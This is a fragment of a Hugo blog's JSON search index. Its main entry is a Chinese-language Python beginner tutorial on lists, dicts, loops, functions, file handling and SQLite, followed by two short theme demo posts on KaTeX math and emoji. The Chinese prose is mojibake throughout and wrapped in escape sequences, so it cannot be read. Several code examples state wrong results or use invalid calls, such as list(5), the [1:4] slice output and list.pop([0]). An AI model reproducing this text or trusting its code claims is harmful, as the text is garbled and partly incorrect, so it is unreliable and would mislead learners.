\u0026#39;Jack\u0026#39; text = \u0026#39;world\u0026#39; print(\u0026#39;hello {name}, hello {text}\u0026#39;.format(name=name, text=text)) \u0026gt;\u0026gt;\u0026gt; hello Jack, hello world å¾æœ€å¾Œé¢æ’å…¥ - append() 1 2 3 4 list1 = [2,4,6,8] list1.append(10) \u0026gt;\u0026gt;\u0026gt; [2,4,6,8,10] å¾æŒ‡å®šä½ç½®æ’å…¥ - insert(ä½ç½®, å€¼) 1 2 3 4 list1 = [2,4,6,8,10] list1.insert(0, -1) \u0026gt;\u0026gt;\u0026gt; [-1,2,4,6,8,10] æ¢ä»¶åˆ¤æ–· æ¢ä»¶åˆ¤æ–·å¼ - if\u0026hellip; elif\u0026hellip; else\u0026hellip; 1 2 3 4 5 6 7 # ä½¿ç”¨ç¸®æ’æ’°å¯«è¦åšçš„äº‹ if æ¢ä»¶A: ... elif æ¢ä»¶B: ... else: ... ä¾‹å¤–åˆ¤æ–· - try\u0026hellip; except\u0026hellip; 1 2 3 4 5 6 7 8 try: # ... except Exception: print(\u0026#34;æœ‰ç•°å¸¸éŒ¯èª¤\u0026#34;) except NameError: print(\u0026#34;è®Šæ•¸æœ‰éŒ¯èª¤\u0026#34;) except TypeError: print(\u0026#34;è³‡æ–™æ ¼å¼éŒ¯èª¤\u0026#34;) except éŒ¯èª¤åˆ†é¡ éŒ¯èª¤ç•°å¸¸åˆ¤æ–· èªªæ˜ Exception åªè¦æœ‰éŒ¯èª¤ NameError è®Šæ•¸åç¨±éŒ¯èª¤ ValueError valueå€¼éŒ¯èª¤ ZeroDivisionError é™¤æ•¸/åˆ†æ¯ä¸å¯ç‚ºé›¶çš„éŒ¯èª¤ TypeError è³‡æ–™æ ¼å¼éŒ¯èª¤ è¿´åœˆ æŠ€è¡“å¼è¿´åœˆ - for 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # è·‘range for i in range(1, 6): print(i, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1 2 3 4 5 # è·‘åœ¨å­—ä¸² for c in \u0026#34;Mary\u0026#34;: print(c, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;M\u0026#34; \u0026#34;a\u0026#34; \u0026#34;r\u0026#34; \u0026#34;y\u0026#34; # è·‘åœ¨é™£åˆ— for e in [\u0026#34;a\u0026#34;, 3, \u0026#34;Jessica\u0026#34;] \u0026gt;\u0026gt;\u0026gt; \u0026#34;a\u0026#34; \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; \u0026#34;Jessica\u0026#34; æ¢ä»¶å¼è¿´åœˆ - while 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # whileè¿´åœˆ i = 0 while i \u0026lt; 5: i += 1 print(i) \u0026gt;\u0026gt;\u0026gt; 1 \u0026gt;\u0026gt;\u0026gt; 2 \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; 4 \u0026gt;\u0026gt;\u0026gt; 5 # Whileåˆ¤æ–·(åè¦†é©—è­‰ç›´åˆ°ansç­‰æ–¼\u0026#34;happy\u0026#34;) ans = input(\u0026#34;è«‹è¼¸å…¥å¿«æ¨‚çš„è‹±æ–‡ï¼š\u0026#34;) while ans != \u0026#34;happy\u0026#34;: ans = input(\u0026#34;æ‹¼éŒ¯å›‰ï¼Œå†çµ¦ä½ ä¸€æ¬¡æ©Ÿæœƒï¼š\u0026#34;) else: print(\u0026#34;ç­”å°å›‰ï¼Œæ˜¯happy\u0026#34;) breakï¼šè·³è„«è¿´åœˆ 1 2 3 4 5 6 7 8 9 ans = input(\u0026#34;è«‹è¼¸å…¥å¿«æ¨‚çš„è‹±æ–‡ï¼š\u0026#34;) while ans.lower() != \u0026#34;happy\u0026#34;: # ç•¶è¼¸å…¥quitæ™‚è·³å‡ºè¿´åœˆ if(ans.lower() == \u0026#34;quit\u0026#34;): print(\u0026#34;çŒœä¸å‡ºä¾†äº†å§ï¼ŒçµæŸ\u0026#34;) break; ans = input(\u0026#34;æ‹¼éŒ¯å›‰ï¼Œå†çµ¦ä½ ä¸€æ¬¡æ©Ÿæœƒï¼š\u0026#34;) else: print(\u0026#34;ç­”å°å›‰ï¼Œæ˜¯\u0026#34;, ans) continueï¼šè·³éç¹¼çºŒé€²è¡Œä¸‹ä¸€è¿´åœˆ 1 2 3 4 5 6 7 8 # ié‡4çš„å› æ•¸å°±è·³é i = 0 while i \u0026lt;= 100: i += 1 # continueå‰è¦å…ˆåŠ 1ï¼Œé¿å…é€²å…¥ç„¡çª®è¿´åœˆ if i % 4 == 0: continue print(i, end=\u0026#34; \u0026#34;) è‡ªè¨‚å‡½å¼ è‡ªå®šç¾©å‡½å¼ - def ä¸€èˆ¬å®£å‘Šå‡½å¼ 1 2 3 4 5 6 7 def printStar(_n): return \u0026#34;*\u0026#34; * _n # åŸ·è¡Œå‡½å¼ print(printStar(6)) \u0026gt;\u0026gt;\u0026gt; ****** è¨­å®šåƒæ•¸é è¨­å€¼ 1 2 3 4 5 6 7 8 9 10 11 def TeaTime(desserts, drink=\u0026#34;å’–å•¡\u0026#34;): print(f\u0026#39;ä¸‹åˆèŒ¶é»å¿ƒç‚º{desserts},é£²æ–™ç‚º{drink}\u0026#39;) TeaTime(\u0026#39;é¦¬å¡é¾\u0026#39;, \u0026#39;ç´…èŒ¶\u0026#39;) # æŒ‡å®šå¯¦éš›åƒæ•¸ TeaTime(\u0026#39;é¦¬å¡é¾\u0026#39;) # é£²æ–™æœƒé¡¯ç¤ºé è¨­å€¼:å’–å•¡ TeaTime() # å…©å€‹åƒæ•¸éƒ½é¡¯ç¤ºé è¨­å€¼ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¦¬å¡é¾,é£²æ–™ç‚ºç´…èŒ¶ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¦¬å¡é¾,é£²æ–™ç‚ºå’–å•¡ \u0026gt;\u0026gt;\u0026gt; ä¸‹åˆèŒ¶é»å¿ƒç‚ºé¬†é¤…,é£²æ–™ç‚ºå’–å•¡ è¨­å®šä¸å®šå€‹æ•¸åƒæ•¸(åƒæ•¸ç‚ºtupleå‹æ…‹) å¸¶å…¥åƒæ•¸å¸¶æ˜Ÿè™Ÿå¯å°‡å¸¶å…¥çš„åƒæ•¸çµ„æˆä¸€å€‹tuple 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(1, 2, 4, 6) \u0026gt;\u0026gt;\u0026gt; 13 å¯¦éš›åƒæ•¸å¸¶æ˜Ÿè™Ÿå¯å°‡åŸç‚ºtupleå‹æ…‹çš„è³‡æ–™æ‹†è§£é–‹ä¾† 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(*range(0, 11)) \u0026gt;\u0026gt;\u0026gt; 55 å¤šå€‹å›å‚³å€¼ 1 2 3 4 5 6 7 8 9 10 11 12 # å›å‚³å€¼ç”¨é€—è™Ÿéš”é–‹ def divmod(x, y): div = x // y mod = x % y return div, mod # ç”¨{a,b}æ¥å¤šå€‹å›å‚³å€¼ a, b = divmod(100, 7) print(f\u0026#39;100é™¤ä»¥7çš„å•†æ•¸ç‚º{a},é¤˜æ•¸ç‚º{b}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 100é™¤ä»¥7çš„å•†æ•¸ç‚º14,é¤˜æ•¸ç‚º2 æ“ä½œ List(åˆ—è¡¨) å»ºç«‹ å»ºç«‹ç©ºlist 1 2 3 4 5 # æ–¹æ³•1: list1 = [] # æ–¹æ³•2: list2 = list() å»ºç«‹list 1 list1 = [1, \u0026#34;taipei\u0026#34;, 2, \u0026#34;tokyo\u0026#34;] # æ¯å€‹çš„è³‡æ–™å‹æ…‹ä¸é™ å¾stringå»ºç«‹list 1 list1 = list(\u0026#34;Hello\u0026#34;) # list1ç‚º [\u0026#34;H\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;o\u0026#34;] å¾rangeå»ºç«‹list 1 list1 = list(5) # list1ç‚º [0,1,2,3,4] å¾å­—ä¸²åˆ†å‰²å»ºç«‹list 1 list1 = \u0026#34;1 2 3\u0026#34;.split() # list1ç‚º [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;] åˆªé™¤ åˆªé™¤æ•´å€‹list 1 del list1 åˆªé™¤listä¸­çš„æŸä¸€å€‹(ä»¥ç¬¬ä¸€å€‹ç‚ºä¾‹) 1 2 3 4 5 6 7 8 # æ–¹æ³•1 del list1[0] # æ–¹æ³•2 list.remove(0) # æ–¹æ³•3 list.pop([0]) æ¸…é™¤listå…ƒç´ (ç­‰æ–¼del list[::]) 1 2 3 4 list1 = [2,4,6,8,10] list1.clear() \u0026gt;\u0026gt;\u0026gt; [] listæ–°å¢å…ƒç´  1 2 3 list.append(x) # é™„åŠ å…ƒç´ åˆ°æœ€å¾Œ list.extend(L) list.inser(i, x) # æ’å…¥å…ƒç´ è‡³æŒ‡å®šä½ç½® æŸ¥è©¢ç´¢å¼• 1 list1.index(\u0026#39;a\u0026#39;) # æŸ¥è©¢aåœ¨list1çš„ç´¢å¼• çµ±è¨ˆå‡ºç¾çš„æ¬¡æ•¸ 1 list1.count(\u0026#39;a\u0026#39;) # çµ±è¨ˆaåœ¨list1ä¸­å‡ºç¾çš„æ¬¡æ•¸ å…ƒç´ æ’åº 1 list.sort() # åŸåœ°æ“ä½œ å…ƒç´ å€’åº 1 list1.reverse() # åŸåœ°æ“ä½œ æ“ä½œ Dict(å­—å…¸) æŸ¥è©¢ ä¸€èˆ¬æŸ¥è©¢ 1 dict1[key] # è‹¥keyå€¼ä¸åœ¨æœƒå ±éŒ¯ ä»¥keyæŸ¥è©¢ï¼Œä½¿ç”¨dict1.get(key, [default]) - (æ¨è–¦) 1 2 3 4 5 6 7 8 9 10 11 12 13 # è‹¥ç„¡keyå€¼å‰‡é¡¯ç¤ºdefault dict1.get(key, [default]) #example: fruits = {\u0026#34;apple\u0026#34;:\u0026#34;30å…ƒ\u0026#34;, \u0026#34;banana\u0026#34;:\u0026#34;10å…ƒ\u0026#34;} Quest = input(\u0026#34;è«‹è¼¸å…¥è¦æŸ¥è©¢çš„åƒ¹æ ¼çš„æ°´æœï¼š\u0026#34;) print(fruits.get(Quest, \u0026#34;æŸ¥ç„¡æ­¤æ°´æœ\u0026#34;)) \u0026lt;\u0026lt;\u0026lt; apple \u0026gt;\u0026gt;\u0026gt; 30å…ƒ \u0026lt;\u0026lt;\u0026lt; orange \u0026gt;\u0026gt;\u0026gt; æŸ¥ç„¡æ­¤æ°´æœ æŸ¥è©¢æ‰€æœ‰çš„key (å›å‚³åˆ—è¡¨) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;å°ä¸¸å­\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;å°ç‰\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;èŠ±è¼ª\u0026#34;} dict1.keys() \u0026gt;\u0026gt;\u0026gt; dict_keys([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) æŸ¥è©¢æ‰€æœ‰çš„values (å›å‚³åˆ—è¡¨) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;å°ä¸¸å­\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;å°ç‰\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;èŠ±è¼ª\u0026#34;} dict1.values() \u0026gt;\u0026gt;\u0026gt; dict_values([\u0026#39;å°ä¸¸å­\u0026#39;, \u0026#39;å°ç‰\u0026#39;, \u0026#39;èŠ±è¼ª\u0026#39;]) å»ºç«‹ å»ºç«‹ç©ºdict 1 2 3 4 5 # æ–¹æ³•1: dict1 = {} # æ–¹æ³•2: dict2 = dict() å»ºç«‹dict 1 dict1 = {1:\u0026#34;one\u0026#34;, 2:\u0026#34;tow\u0026#34;, 3:\u0026#34;three\u0026#34;} æ–°å¢dict 1 dict1[newKey] = value æ›´æ–° æ›´æ–°dict 1 dict1[oldKey] = value æ¯”å°æ›´æ–° - update update æœƒæ¯”å°æ²’æœ‰çš„keyä¸¦è£œä¸Šï¼Œæ¯”å°æœ‰çš„keyé€²è¡Œvalueæ›´æ–°ã€‚ 1 2 3 4 5 6 dict1 = {\u0026#39;user1\u0026#39;: \u0026#39;å°ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;} dict2 = {\u0026#39;user1\u0026#39;: \u0026#39;å¤§ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;å¤šæ‹‰Aå¤¢\u0026#39;} dict1.update(dict2) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;user1\u0026#39;: \u0026#39;å¤§ä¸¸å­\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;å°ç‰\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;èŠ±è¼ª\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;å¤šæ‹‰Aå¤¢\u0026#39;} åˆªé™¤ åˆªé™¤æ•´å€‹dict 1 del dict1 æ¸…ç©ºæ•´å€‹dict 1 dict1.clear() åˆªé™¤listä¸­çš„æŸä¸€å€‹(ä»¥ç¬¬ä¸€å€‹ç‚ºä¾‹) 1 del dict1[key] æ“ä½œ class (é¡åˆ¥/ç‰©ä»¶å°å‘) å°è£æˆä¸€å€‹é¡åˆ¥ - class é¡åˆ¥åç¨±: pythonçš„classæœƒè‡ªå‹•åŸ·è¡Œ__init__å‡½å¼ï¼Œå¯è‡ªè¡Œå®šç¾©__init__å…§è¦åšçš„äº‹ã€‚ __init__ç¬¬ä¸€å€‹åƒæ•¸é è¨­ç‚ºselfã€‚ 1 2 3 4 5 6 7 class GoogleSpyder: def __init__(self, keyword): self.keyword = keyword self.url_tmp = \u0026#34;http://google.com/search?q=\u0026#34; + keyword + \u0026#34;\u0026amp;start={}\u0026#34; self.headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} googleSpyder = GoogleSpyder(\u0026#34;python\u0026#34;) # è‡ªå‹•åŸ·è¡Œ __init__ æª”æ¡ˆè™•ç† è®€å¯«æ¨¡å¼ æ¨¡å¼ èªªæ˜ r readï¼šè®€å–(æª”æ¡ˆéœ€å­˜åœ¨) w writeï¼šæ–°å»ºæª”æ¡ˆå¯«å…¥(æª”æ¡ˆå¯ä¸å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å‰‡æ¸…ç©º) a appendï¼šè³‡æ–™é™„åŠ åˆ°èˆŠæª”æ¡ˆå¾Œé¢(æ¸¸æ¨™æŒ‡åœ¨æª”æ¡ˆçµå°¾ï¼Œæª”æ¡ˆå¯ä¸å­˜åœ¨) r+ è®€å–èˆŠè³‡æ–™ä¸¦å¯«å…¥(æª”æ¡ˆéœ€å­˜åœ¨ä¸”æ¸¸æ¨™æŒ‡åœ¨é–‹é ­) w+ æ¸…ç©ºæª”æ¡ˆå…§å®¹ï¼Œæ–°å¯«å…¥çš„æ±è¥¿å¯å†è®€å‡º a+ è³‡æ–™é™„åŠ åˆ°èˆŠæª”æ¡ˆå¾Œé¢ï¼Œå¯è®€å–è³‡æ–™ b äºŒé€²ä½æ¨¡å¼ è¨˜æ†¶æ–¹å¼ï¼š 1 2 3 4 wã€w+ # æœƒæ¸…é™¤åŸæª”æ¡ˆå…§å®¹ rã€r+ # æª”æ¡ˆæŒ‡æ¨™æŒ‡å‘æª”æ¡ˆé–‹é ­ aã€a+ # æª”æ¡ˆæŒ‡æ¨™æŒ‡å‘æª”æ¡ˆçµå°¾ + # å¯è®€å¯å¯«æ¨¡å¼ æª”æ¡ˆé–‹å•Ÿ - open() æ“ä½œå¾Œéœ€é—œæª” - close() 1 2 3 4 5 6 7 8 9 10 content = \u0026#34;\u0026#34;\u0026#34;Hello Python ä¸­æ–‡æ¸¬è©¦ abc 123456.321654987 $@^$%^@#$!@#$ \u0026#34;\u0026#34;\u0026#34; file = open(\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) ... file.close() è®€å– - read() myfile.txt 1 testtest123 test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) print(file.read()) file.close() åŸ·è¡Œå›å‚³ 1 \u0026gt;\u0026gt;\u0026gt; testtest123 å¯«å…¥ - write() test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;testtest123\u0026#39;) file.close() myfile.txt 1 testtest123 ç§»å‹•è®€å¯«é ­ - seek() 1 2 3 4 5 6 7 8 9 10 11 12 content = \u0026#34;\u0026#34;\u0026#34;Hello Python\u0026#34;\u0026#34;\u0026#34; file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) # file.write(content) file_content = file.read() print(file_content) file.seek(0) # ç§»å‹•è®€å¯«é ­åˆ°é–‹é ­ file_content = file.read() print(file_content) file.close() åŸ·è¡Œå›å‚³ 1 2 \u0026gt;\u0026gt;\u0026gt; Hello Python \u0026gt;\u0026gt;\u0026gt; Hello Python è®€å‡ºè¡Œæ•¸ - readline() \u0026amp; readlines() readlineï¼šä¸€è¡Œä¸€è¡Œè®€ readlinesï¼šä¸€æ¬¡è®€å…¨éƒ¨è¡Œæ•¸ poem.txt 1 2 3 4 æ¾ä¸‹å•ç«¥å­ è¨€å¸«æ¡è—¥å» åªåœ¨æ­¤å±±ä¸­ é›²æ·±ä¸çŸ¥è™• read.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # readlines() ä¸€æ¬¡è®€å‡º f = open(r\u0026#39;poem.txt\u0026#39;, \u0026#39;r\u0026#39;) lines = f.readlines() for line in lines: print(line, end=\u0026#39;\u0026#39;) f.seek(0) # è®€å¯«é ­å›åˆ°é–‹é ­ # readline() ä¸€è¡Œä¸€è¡Œè®€ line = f.readline() while line != \u0026#39;\u0026#39;: print(line, end=\u0026#39;\u0026#39;) line = f.readline() f.close() åŸ·è¡Œå›å‚³ï¼š 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; æ¾ä¸‹å•ç«¥å­ \u0026gt;\u0026gt;\u0026gt; è¨€å¸«æ¡è—¥å» \u0026gt;\u0026gt;\u0026gt; åªåœ¨æ­¤å±±ä¸­ \u0026gt;\u0026gt;\u0026gt; é›²æ·±ä¸çŸ¥è™• ä½¿ç”¨ with-open-as åšè®€æª”æ¡ˆçš„å‹•ä½œ - (æ¨è–¦) 1 2 with open(r\u0026#34;poem.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: print(file.read()) åŸ·è¡Œå›å‚³ï¼š 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; æ¾ä¸‹å•ç«¥å­ \u0026gt;\u0026gt;\u0026gt; è¨€å¸«æ¡è—¥å» \u0026gt;\u0026gt;\u0026gt; åªåœ¨æ­¤å±±ä¸­ \u0026gt;\u0026gt;\u0026gt; é›²æ·±ä¸çŸ¥è™• åˆªé™¤æª”æ¡ˆ - remove() ä½¿ç”¨osæ¨¡çµ„ ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ 1 2 3 4 5 6 7 8 import os file = r\u0026#34;poem2.txt\u0026#34; if os.path.exists(file): os.remove(file) else: print(\u0026#39;No exists file\u0026#39;) æ–°å¢ç›®éŒ„ - mkdir() ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): print(\u0026#34;Direct is exists\u0026#34;) else: os.mkdir(dir) åˆªé™¤ç©ºç›®éŒ„ - rmdir() ä½¿ç”¨os.path.existsåˆ¤æ–·æª”æ¡ˆæ˜¯å¦å­˜åœ¨ é™å®šç©ºç›®éŒ„ 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): os.rmdir(dir) else: print(\u0026#34;Direct is undefine\u0026#34;) åˆªé™¤ç›®éŒ„èˆ‡åº•ä¸‹å…¨éƒ¨æª”æ¡ˆ - rmtree() ä½¿ç”¨shell utilityæ¨¡çµ„ - shutil éœ€è¬¹æ…ä½¿ç”¨é¿å…åˆªéŒ¯ç›®éŒ„ 1 2 3 import shutil shutil.rmtree(\u0026#34;testDir\u0026#34;) Python èªæ³•ç­†è¨˜ å…©å€‹è®Šæ•¸äº¤æ›å€¼(Python Only) 1 2 3 4 x = 3 y = 8 x,y = y,x # äº¤æ›å…©å€‹è®Šæ•¸çš„å€¼ print(x,y) é–‹é ­å®£å‘Šç·¨ç¢¼æ–¹å¼å¯ç›´æ¥å¼·è½‰(Python Only) 1 2 3 4 # -*- coding: utf-8 -*- # è½‰utf-8 print(\u0026#34;å“ˆå›‰\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;å“ˆå›‰\u0026#34; Pythonå‡½æ•¸å¸¶å…¥åƒæ•¸æ–¹å¼ åƒæ•¸ä»¥tupleå‚³å…¥functionã€‚ 1 2 3 4 5 6 def func1(*args): print(args) func2(1,3,5,7,9) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) åƒæ•¸ä»¥tupleæ‹†è§£ï¼Œé€²functionåœ¨çµ„åˆå›tupleã€‚ 1 2 3 4 5 6 def func2(*args): print(args) func2(*(2,4,6,8,10)) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) åƒæ•¸ä»¥dictå‚³å…¥functionã€‚ 1 2 3 4 5 6 def func3(**kwargs): print(kwargs) func3(even=(2,4,6,8), odd=(1,3,5,7,9)) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} åƒæ•¸ä»¥dictæ‹†è§£ï¼Œé€²functionåœ¨çµ„åˆå›dict(éœ€ç‚ºåƒæ•¸æŒ‡å®šé—œéµå­—)(é—œéµå­—åƒæ•¸)ã€‚ 1 2 3 4 5 6 def func4(**kwargs): print(kwargs) func4(**{\u0026#34;even\u0026#34;:(2,4,6,8), \u0026#34;odd\u0026#34;:(1,3,5,7,9)}) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} å…¶ä»– å­—ä¸²é‹ç®—(Python Only) inï¼šæ˜¯å¦å«æœ‰ 1 2 3 # in \u0026#34;or\u0026#34; in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; True not inï¼šæ˜¯å¦ä¸å«æœ‰ 1 2 3 # not in \u0026#34;abc\u0026#34; not in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; False å–å­—ä¸²çš„ç‰¹å®šä½ç½®å­—å…ƒ æ ¼å¼ï¼šé–‹å§‹é»:çµæŸé»:é–“éš” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # å–ç¬¬1~4å€‹å­—å…ƒ(ä¸å«ç¬¬4å€‹) \u0026#34;abcdefg\u0026#34;[1:4] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bcde\u0026#39; # å–ç¬¬1~4å€‹å­—å…ƒ(æ¯æ¬¡é–“éš”2å€‹) \u0026#34;abcdefg\u0026#34;[1:4:2] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bd\u0026#39; # å–æœ€å¾Œä¸€å€‹å­—å…ƒ \u0026#34;abcdefg\u0026#34;[-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;g\u0026#39; # åè½‰ \u0026#34;abcdefg\u0026#34;[::-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;gfedcba\u0026#39; SQLite é—œè¯å¼è³‡æ–™åº«(ç‰ˆæœ¬3.31.1) ç³»çµ±å‘½ä»¤(.é–‹é ­)ï¼ŒSQLå‘½ä»¤(;çµå°¾)\nç³»çµ±å‘½ä»¤ é€²å…¥è³‡æ–™åº« æŒ‡ä»¤ï¼šsqlite3 è³‡æ–™åº«åç¨± 1 2 3 sqlite3 test01.sqlite sqlite\u0026gt; è³‡æ–™åº« (DB) sqliteæŒ‡ä»¤æ–°å¢è³‡æ–™åº« 1 .open test01 sqliteæŒ‡ä»¤æŸ¥è©¢æ‰€æœ‰è³‡æ–™åº« 1 .databases è³‡æ–™è¡¨ (Table) æ¬„ä½è¨­å®š èªªæ˜ NM (None)å¯å¦å…è¨±ç©ºå€¼ PK (Primary Key)æ˜¯å¦ç‚ºä¸»éµ AI (A.I)æ˜¯å¦è‡ªå‹•ç”¢ç”Ÿå€¼ U (Unique)ä¸é‡è¤‡éµ æ–°å¢è³‡æ–™è¡¨ 1 create table studen(ID Integer, name String, score Integer); sqliteæŒ‡ä»¤æŸ¥è©¢æ‰€æœ‰è³‡æ–™è¡¨ 1 .table æ›´æ–°è³‡æ–™è¡¨ SQLèªæ³•ï¼šALTER TABLE è³‡æ–™åº« ADD COLUMN æ¬„ä½åç¨± è³‡æ–™å‹æ…‹\n1 ALTER TABLE student ADD COLUMN address String; è³‡æ–™æ“ä½œ (CRUD:Create/Read/Update/Delete) æ’å…¥è³‡æ–™ SQLèªæ³•ï¼šINSERT INTO è³‡æ–™è¡¨ VALUES(æ¬„ä½1, æ¬„ä½2, æ¬„ä½3)\n1 INSERT INTO student values(1001, \u0026#34;Ben\u0026#34;, 88); æŸ¥è©¢è³‡æ–™ SQLèªæ³•ï¼šSELECT æ¬„ä½ FROM è³‡æ–™è¡¨ [WHERE æ¢ä»¶];\n1 SELECT Score from student WHERE ID = 1001; åˆªé™¤è³‡æ–™ SQLèªæ³•ï¼šDELETE FROM è³‡æ–™è¡¨ [WHERE æ¢ä»¶];\n1 DELETE from student WHERE ID = 1001; ä¿®æ”¹è³‡æ–™ SQLèªæ³•ï¼šUPDATE è³‡æ–™è¡¨ SET æ¬„ä½åç¨± = å€¼ [WHERE æ¢ä»¶];\n1 UPDATE student SET Name = \u0026#34;Amanda\u0026#34; WHERE ID = 1001; ","date":"2020-03-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52283398446_ed21ce37f2_o.png","permalink":"https://wayneblog.ga/2020-03-15/python-beginner-tutorial/","title":"æ™ºæ…§å•†æ¥­Pythonæ•¸æ“šåˆ†æèˆ‡æ‡‰ç”¨ç­(ç‰ˆæœ¬3.*)"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://wayneblog.ga/2019-03-08/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nğŸ™ˆ :see_no_evil: ğŸ™‰ :hear_no_evil: ğŸ™Š :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://wayneblog.ga/2019-03-05/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2019-03-05/emoji-support/","title":"Emoji Support"}]